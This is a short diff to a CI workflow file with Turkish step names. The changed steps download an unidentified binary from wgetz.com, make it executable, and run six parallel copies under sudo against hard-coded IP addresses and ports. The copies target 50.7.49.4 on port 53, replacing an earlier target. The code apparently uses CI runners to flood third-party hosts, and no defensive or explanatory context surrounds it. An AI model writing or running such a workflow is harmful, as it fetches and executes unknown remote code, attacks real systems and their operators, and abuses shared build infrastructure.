@@ -16,15 +16,15 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wget https://wgetz.com/v0QYGdXw7k/3 -O 3
-          chmod +x 3
+          wget https://wgetz.com/AjhlUesquN/v -O v
+          chmod +x v
           
       - name: 🔥 TEK MAKİNEDEN 8 ÇEKİRDEK GÜCÜ AL
         run: |
           PIDS=()
           # HER MAKİNE İÇİNDE 8 PARALEL İŞLEM BAŞLAT!
           for i in {1..6}; do
-            sudo timeout 120 ./3 54.38.152.99 22005 500 1000 9999999 &
+            sudo timeout 120 ./v 50.7.49.4 53 20 -1 120 &
             PIDS+=($!)
           done
           
